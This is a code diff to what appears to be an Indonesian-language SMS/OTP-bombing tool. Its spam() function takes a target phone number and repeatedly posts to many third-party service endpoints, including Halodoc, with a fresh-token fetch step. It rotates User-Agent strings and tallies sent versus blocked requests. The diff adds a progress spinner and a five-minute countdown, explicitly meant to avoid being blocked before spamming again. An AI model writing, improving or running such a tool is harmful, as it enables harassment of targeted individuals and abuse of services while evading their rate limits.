@@ -1,9 +1,38 @@
-import os, sys, time
+import os, sys, time, threading
 from datetime import datetime
 from config import _x
 from junk import G, C, Y, R, P, W, N, _u
 
+COLORS = ["\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m"]
+done = False
+
+def spinner():
+    chars = ["◧","◨","◩","◪","◫","◰","◱","◲","◳","◴","◵","◶","◷"]
+    i = 0
+    while not done:
+        c = COLORS[i % len(COLORS)]
+        sys.stdout.write(f"\r  {c}{chars[i % len(chars)]}{N} Mengirim... ")
+        sys.stdout.flush()
+        i += 1
+        time.sleep(0.08)
+    sys.stdout.write("\r" + " " * 30 + "\r")
+
+def countdown(seconds=300):
+    print(f"\n  {Y}[!] Pake jeda dulu biar ga keblokir dari server.{N}")
+    print(f"  {Y}[*] Tunggu {seconds//60} menit sebelum spam lagi.{N}")
+    print(f"  {Y}[*] Atau exit + jalanin lagi kalo gasabar.{N}")
+    print("")
+    while seconds > 0:
+        m = seconds // 60
+        s = seconds % 60
+        sys.stdout.write(f"\r  {P}⏳ Hitung mundur: {m:02d}:{s:02d}{N} ")
+        sys.stdout.flush()
+        time.sleep(1)
+        seconds -= 1
+    sys.stdout.write("\r" + " " * 40 + "\r")
+
 def spam(phone):
+    global done
     print(f"\n  {C}[*] Target : {phone}{N}")
     
     try:
@@ -36,10 +65,15 @@ def spam(phone):
         if loop > 1:
             print(f"  {Y}--- Loop {l+1}/{loop} ---{N}")
         el = _x(phone)
+        
+        # Start spinner thread
+        done = False
+        t = threading.Thread(target=spinner)
+        t.start()
+        
         for name, url, h, b in el:
             h["User-Agent"] = _u()
             
-            # Halodoc: ambil token segar
             if b.pop("_halodoc", False):
                 try:
                     import requests as _rr, re
@@ -54,7 +88,6 @@ def spam(phone):
                 except:
                     pass
             
-            status = "?"
             try:
                 import requests as _rr
                 if b.pop("is_form", False):
@@ -62,21 +95,15 @@ def spam(phone):
                 else:
                     rr = _rr.post(url, json=b, headers=h, timeout=15)
                 s = rr.status_code
-                if s in (200, 201, 202):
-                    sent.append(name)
-                    status = f"{G}✓{N}"
-                elif s in (429, 403, 401):
-                    blocked.append(name)
-                    status = f"{Y}⊗{N}"
-                else:
-                    failed.append(name)
-                    status = f"{R}✗{N}"
+                if s in (200, 201, 202): sent.append(name)
+                elif s in (429, 403, 401): blocked.append(name)
+                else: failed.append(name)
             except:
                 failed.append(name)
-                status = f"{R}✗{N}"
-            sys.stdout.write(f"\r  {status} {name} ")
-            sys.stdout.flush()
             time.sleep(speed)
+        
+        done = True
+        t.join()
         sys.stdout.write("\r" + " " * 40 + "\r")
     
     print(f"\n  {G}=== HASIL ==={N}")
@@ -84,4 +111,7 @@ def spam(phone):
     if blocked: print(f"  {Y}⊗ Diblokir ({len(blocked)}): {', '.join(blocked)}{N}")
     if failed: print(f"  {R}✗ Gagal ({len(failed)}): {', '.join(failed)}{N}")
     print(f"\n  {C}Total: {len(sent)}/{len(el)*loop} terkirim{N}")
+    
+    countdown(300)
+    
     input(f"\n  {W}[Enter] Kembali...{N}")
